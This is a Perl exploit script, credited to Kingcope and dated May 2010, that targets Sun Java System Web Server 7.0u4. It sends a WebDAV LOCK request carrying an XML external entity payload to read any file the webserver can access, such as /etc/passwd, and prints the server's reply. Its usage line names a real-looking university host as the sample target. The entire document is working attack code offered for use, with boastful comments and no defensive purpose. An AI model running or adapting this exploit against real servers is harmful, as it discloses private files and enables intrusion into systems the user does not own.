#!/usr/bin/perl
# aNOTH3R TiP OF THE iCE-BERG ReMOTE eXPLoiT
# oO SUN MiCROSYSTEMZ - SUN JAVA SYSTEM WEB SERVER Oo
# oO REMOTE FiLE DiSCLOSURE EXPLOIT Oo
# oO BUG FOUND & EXPLOiTED BY KiNGCOPE // ISOWAREZ.DE Oo
# !! THIS EXPLOIT IS NOW PRIVATE ON FULL DISCLOSURE !!
# MAY/2010
# VERY THANKS TO LSD
#
#
# oO VERiFIED oN Oo
#
# SUN JAVA SYSTEM WEB SERVER 7.0U4 B12/02/2008 [PLatFoRMz: WiNDOWS
SERVER 2008 & SunOS 5.10]
# SHOULD GiVE YOU READABLE FiLES BY UID WEBSERVD
# [SunONE/iPLANET MAY ALSO BE EXPLOiTABLE]
# RoCKiNG tHA SuRFACE SiNCE 2003 kTHX

use IO::Socket;
use MIME::Base64;

print "//Sun Microsystems Sun Java System Web Server\n";
print "//Remote File Disclosure Exploit\n";
print "//by Kingcope\n";
print "May/2010\n";

if ($#ARGV != 2) {
	print "usage: perl sunone.pl <target> <webdav directory> <file to get>\n";
	print "sample: perl sunone.pl lib7.berkeley.edu /dav /etc/passwd\n";
	exit;
}

$target = $ARGV[0];

$|=1;

$remotefile = $ARGV[2];
$folder = $ARGV[1];

$KRADXmL =
"<?xml version=\"1.0\"?>\n"
."<!DOCTYPE REMOTE [\n"
."<!ENTITY RemoteX SYSTEM \"$remotefile\">\n"
."]>\n"
."<D:lockinfo xmlns:D='DAV:'>\n"
."<D:lockscope><D:exclusive/></D:lockscope>\n"
."<D:locktype><D:write/></D:locktype>\n"
."<D:owner>\n"
."<D:href>\n"
."<REMOTE>\n"
."<RemoteX>&RemoteX;</RemoteX>\n"
."</REMOTE>\n"
."</D:href>\n"
."</D:owner>\n"
."</D:lockinfo>\n";

$sock = IO::Socket::INET->new(PeerAddr => $target,
                              PeerPort => '80',
                              Proto    => 'tcp');

print $sock "LOCK /$folder HTTP/1.1\r\n".
			"Host: $target\r\n".
			"Depth: 0\r\n".
			"Connection: close\r\n".			
			"Content-Type: application/xml\r\nContent-Length:
".length($KRADXmL)."\r\n\r\n".
			$KRADXmL;

$locktoken = "";			
while(<$sock>) {
	if ($_ =~ /^Lock-token:\s(.*)?\r/) {
		$locktoken = $1;
		chomp $locktoken;
	}
	print;
}

close($sock);

$sock = IO::Socket::INET->new(PeerAddr => $target,
                              PeerPort => '80',
                              Proto    => 'tcp');

print $sock "UNLOCK /$folder HTTP/1.1\r\n".
			"Host: $target\r\n".
			"Connection: close\r\n".
			"Lock-token: $locktoken\r\n\r\n";
			
while(<$sock>) {
	print;	
}
close($sock);